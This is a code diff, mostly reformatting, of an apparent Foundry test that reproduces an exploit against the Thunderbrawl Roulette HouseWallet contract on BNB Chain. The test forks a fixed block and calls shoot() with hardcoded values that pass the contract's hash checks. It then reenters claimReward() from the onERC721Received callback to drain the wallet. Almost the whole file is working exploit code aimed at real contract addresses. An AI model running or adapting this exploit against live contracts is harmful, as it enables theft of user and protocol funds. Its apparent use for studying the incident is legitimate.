@@ -12,8 +12,9 @@ interface IERC721Receiver {
         bytes calldata data
     ) external returns (bytes4);
 }
-interface HouseWallet{
-    function winners(uint256 id, address player) view external returns(uint256);
+
+interface HouseWallet {
+    function winners(uint256 id, address player) external view returns (uint256);
     function claimReward(
         uint256 _ID,
         address payable _player,
@@ -35,16 +36,15 @@ interface HouseWallet{
     ) external payable;
 }
 
-contract ContractTest is DSTest{
-
+contract ContractTest is DSTest {
     HouseWallet houseWallet = HouseWallet(0xae191Ca19F0f8E21d754c6CAb99107eD62B6fe53);
-    uint256 randomNumber =  12345678000000000000000000;
+    uint256 randomNumber = 12_345_678_000_000_000_000_000_000;
 
     uint256 gameId = 1;
     bool feestate = false;
-     // sha256(abi.encode(_x, name, _add)) == hashValueTwo maybe off-chain calculate
-    uint256 _x = 2845798969920214568462001258446;
-    string  name = "HATEFUCKINGHACKERSTHEYNEVERCANHACKTHISIHATEPREVIOUS";
+    // sha256(abi.encode(_x, name, _add)) == hashValueTwo maybe off-chain calculate
+    uint256 _x = 2_845_798_969_920_214_568_462_001_258_446;
+    string name = "HATEFUCKINGHACKERSTHEYNEVERCANHACKTHISIHATEPREVIOUS";
     address _add = 0x6Ee709bf229c7C2303128e88225128784c801ce1;
 
     bool nftcheck = true;
@@ -53,50 +53,38 @@ contract ContractTest is DSTest{
     address payable add = payable(address(this));
     bool _rewardStatus = true;
     // sha256(abi.encode(_x, name, _add)) == hashValue  maybe off-chain calculate
-    uint256 _x1 = 969820990102090205468486;
+    uint256 _x1 = 969_820_990_102_090_205_468_486;
     string name1 = "WELCOMETOTHUNDERBRAWLROULETTENOWYOUWINTHESHOOTINGGAME";
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
     IERC721 THBR = IERC721(0x72e901F1bb2BfA2339326DfB90c5cEc911e2ba3C); // Thunderbrawl Roulette Contract
-        
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 21785004);
+        cheats.createSelectFork("bsc", 21_785_004);
     }
 
-    function testExploit() public{
-
-        emit log_named_uint(
-            "Attacker THBR balance before exploit",
-            THBR.balanceOf(address(this))
-        );
+    function testExploit() public {
+        emit log_named_uint("Attacker THBR balance before exploit", THBR.balanceOf(address(this)));
 
         houseWallet.shoot{value: 0.32 ether}(randomNumber, gameId, feestate, _x, name, _add, nftcheck, dystopianCheck);
         uint256 _amount = houseWallet.winners(gameId, add);
         houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);
 
-        emit log_named_uint(
-            "Attacker THBR balance after exploit",
-            THBR.balanceOf(address(this))
-        );
-
+        emit log_named_uint("Attacker THBR balance after exploit", THBR.balanceOf(address(this)));
     }
 
     receive() external payable {}
 
     function onERC721Received(
-        address _operator, 
-        address _from, 
-        uint256 _tokenId, 
+        address _operator,
+        address _from,
+        uint256 _tokenId,
         bytes calldata _data
-        ) 
-        payable 
-        external 
-        returns (bytes4){
-            uint256 _amount = houseWallet.winners(gameId, add);
-            if(address(houseWallet).balance >= _amount * 2){
-                houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);
-            }
-            return this.onERC721Received.selector;
+    ) external payable returns (bytes4) {
+        uint256 _amount = houseWallet.winners(gameId, add);
+        if (address(houseWallet).balance >= _amount * 2) {
+            houseWallet.claimReward(gameId, add, _amount, _rewardStatus, _x1, name1, _add);
         }
+        return this.onERC721Received.selector;
+    }
 }
